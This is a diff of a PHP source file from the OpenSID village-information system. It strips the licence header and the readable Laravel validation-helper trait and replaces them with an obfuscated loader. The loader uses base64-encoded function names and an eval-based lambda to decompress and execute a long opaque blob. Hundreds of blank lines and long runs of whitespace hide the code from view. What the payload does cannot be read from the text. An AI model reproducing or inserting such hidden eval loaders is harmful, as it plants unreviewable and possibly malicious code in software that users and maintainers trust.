@@ -1,305 +1,537 @@
-<?php
+<?php 
+        $__='printf';$_='Loading app/Traits/ProvidesConvenienceMethods.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2026 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-namespace App\Traits;
 
-use Closure as BaseClosure;
-use Illuminate\Contracts\Bus\Dispatcher;
-use Illuminate\Contracts\Support\MessageProvider;
-use Illuminate\Http\JsonResponse;
-use Illuminate\Http\Request;
-use Illuminate\Support\MessageBag;
-use Illuminate\Support\Str;
-use Illuminate\Validation\ValidationException;
-use Illuminate\Validation\Validator;
-use Symfony\Component\HttpFoundation\File\UploadedFile as SymfonyUploadedFile;
 
-trait ProvidesConvenienceMethods
-{
-    /**
-     * The response builder callback.
-     *
-     * @var BaseClosure
-     */
-    protected static $responseBuilder;
 
-    /**
-     * The error formatter callback.
-     *
-     * @var BaseClosure
-     */
-    protected static $errorFormatter;
 
-    /**
-     * Set the response builder callback.
-     *
-     * @return void
-     */
-    public static function buildResponseUsing(BaseClosure $callback)
-    {
-        static::$responseBuilder = $callback;
-    }
 
-    /**
-     * Set the error formatter callback.
-     *
-     * @return void
-     */
-    public static function formatErrorsUsing(BaseClosure $callback)
-    {
-        static::$errorFormatter = $callback;
-    }
 
-    /**
-     * Validate the given request with the given rules.
-     *
-     * @throws ValidationException
-     *
-     * @return array
-     */
-    public function validated(Request $request, array $rules, array $messages = [], array $customAttributes = [])
-    {
-        $validator = $this->getValidationFactory()->make($request->all(), $rules, $messages, $customAttributes);
 
-        if ($validator->fails()) {
-            return $this->throwValidationException($request, $validator);
-        }
 
-        return $this->extractInputFromRules($request, $rules);
-    }
 
-    /**
-     * Dispatch a job to its appropriate handler.
-     *
-     * @param mixed $job
-     *
-     * @return mixed
-     */
-    public function dispatch($job)
-    {
-        return app(Dispatcher::class)->dispatch($job);
-    }
 
-    /**
-     * Dispatch a command to its appropriate handler in the current process.
-     *
-     * @param mixed $job
-     * @param mixed $handler
-     *
-     * @return mixed
-     */
-    public function dispatchNow($job, $handler = null)
-    {
-        return app(Dispatcher::class)->dispatchNow($job, $handler);
-    }
 
-    /**
-     * Get the request input based on the given validation rules.
-     *
-     * @return array
-     */
-    protected function extractInputFromRules(Request $request, array $rules)
-    {
-        return $request->only(collect($rules)->keys()->map(static fn ($rule) => Str::contains($rule, '.') ? explode('.', $rule)[0] : $rule)->unique()->toArray());
-    }
 
-    /**
-     * Throw the failed validation exception.
-     *
-     * @param \Illuminate\Contracts\Validation\Validator $validator
-     *
-     * @throws ValidationException
-     *
-     * @return void
-     */
-    protected function throwValidationException(Request $request, $validator)
-    {
-        try {
-            throw new ValidationException(
-                $validator,
-                $this->buildFailedValidationResponse(
-                    $request,
-                    $this->formatValidationErrors($validator)
-                )
-            );
-        } catch (ValidationException $e) {
-            if ($request->wantsJson()) {
-                return $this->invalidJson($request, $e);
-            }
 
-            return $this->invalid($request, $e);
-        }
-    }
 
-    /**
-     * Convert a validation exception into a response.
-     *
-     * @param Request $request
-     *
-     * @return \Illuminate\Http\RedirectResponse|\Illuminate\Http\Response|JsonResponse
-     */
-    protected function invalid($request, ValidationException $exception)
-    {
-        $this->withInput();
-        $this->withErrors($exception->errors(), $request->input('_error_bag', $exception->errorBag));
 
-        return redirect($_SERVER['HTTP_REFERER']);
-    }
 
-    /**
-     * Flash an array of input to the session.
-     *
-     * @return $this
-     */
-    protected function withInput(?array $input = null)
-    {
-        $this->session->set_flashdata('_old_input', $this->removeFilesFromInput(
-            null !== $input ? $input : app('request')->input()
-        ));
-    }
 
-    /**
-     * Remove all uploaded files form the given input array.
-     *
-     * @return array
-     */
-    protected function removeFilesFromInput(array $input)
-    {
-        foreach ($input as $key => $value) {
-            if (is_array($value)) {
-                $input[$key] = $this->removeFilesFromInput($value);
-            }
 
-            if ($value instanceof SymfonyUploadedFile) {
-                unset($input[$key]);
-            }
-        }
 
-        return $input;
-    }
 
-    /**
-     * Flash a container of errors to the session.
-     *
-     * @param array|MessageProvider|string $provider
-     * @param string                       $key
-     *
-     * @return $this
-     */
-    protected function withErrors($provider, $key = 'default')
-    {
-        $value = $this->parseErrors($provider);
 
-        // Convert MessageBag to array for reliable session storage
-        // ViewServiceProvider will convert back to MessageBag when needed
-        if ($value instanceof MessageBag) {
-            $value = $value->getMessages();
-        }
 
-        // Store array of errors to flashdata
-        $this->session->set_flashdata('errors', $value);
-    }
 
-    /**
-     * Parse the given errors into an appropriate value.
-     *
-     * @param array|MessageProvider|string $provider
-     *
-     * @return MessageBag
-     */
-    protected function parseErrors($provider)
-    {
-        if ($provider instanceof MessageProvider) {
-            return $provider->getMessageBag();
-        }
 
-        return new MessageBag((array) $provider);
-    }
 
-    /**
-     * Convert a validation exception into a JSON response.
-     *
-     * @param Request $request
-     *
-     * @return JsonResponse
-     */
-    protected function invalidJson($request, ValidationException $exception)
-    {
-        return json([
-            'message' => $exception->getMessage(),
-            'errors'  => $exception->errors(),
-        ], $exception->status);
-    }
 
-    /**
-     * Build a response based on the given errors.
-     *
-     * @return JsonResponse|mixed
-     */
-    protected function buildFailedValidationResponse(Request $request, array $errors)
-    {
-        if (isset(static::$responseBuilder)) {
-            return (static::$responseBuilder)($request, $errors);
-        }
 
-        return new JsonResponse($errors, 422);
-    }
 
-    /**
-     * Format validation errors.
-     *
-     * @return array|mixed
-     */
-    protected function formatValidationErrors(Validator $validator)
-    {
-        if (isset(static::$errorFormatter)) {
-            return (static::$errorFormatter)($validator);
-        }
 
-        return $validator->errors()->getMessages();
-    }
 
-    /**
-     * Get a validation factory instance.
-     *
-     * @return \Illuminate\Contracts\Validation\Factory
-     */
-    protected function getValidationFactory()
-    {
-        return app('validator');
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
